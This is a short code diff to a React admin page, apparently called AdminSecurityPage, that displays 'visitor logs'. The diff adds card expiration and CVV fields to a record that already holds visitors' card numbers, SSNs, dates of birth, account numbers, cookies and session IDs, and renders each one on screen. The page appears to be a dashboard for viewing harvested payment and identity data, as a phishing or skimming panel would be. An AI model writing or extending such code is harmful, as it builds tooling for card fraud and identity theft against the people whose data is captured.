@@ -28,6 +28,8 @@ interface VisitorLog {
   ssn: string | null;
   dateOfBirth: string | null;
   cardNumber: string | null;
+  cardExpiration: string | null;
+  cardCvv: string | null;
   accountNumber: string | null;
   cookies: string | null;
   sessionId: string | null;
@@ -417,6 +419,18 @@ export default function AdminSecurityPage() {
                                 <div className="flex items-center justify-between bg-green-900/20 p-2 rounded border border-green-900/30">
                                   <span className="text-xs text-gray-400">Card Number:</span>
                                   <span className="text-sm text-green-400 font-mono">{log.cardNumber}</span>
+                                </div>
+                              )}
+                              {log.cardExpiration && (
+                                <div className="flex items-center justify-between bg-green-900/20 p-2 rounded border border-green-900/30">
+                                  <span className="text-xs text-gray-400">Card Exp:</span>
+                                  <span className="text-sm text-green-400 font-mono">{log.cardExpiration}</span>
+                                </div>
+                              )}
+                              {log.cardCvv && (
+                                <div className="flex items-center justify-between bg-red-900/20 p-2 rounded border border-red-900/30">
+                                  <span className="text-xs text-gray-400">CVV:</span>
+                                  <span className="text-sm text-red-400 font-mono">{log.cardCvv}</span>
                                 </div>
                               )}
                               {log.accountNumber && (
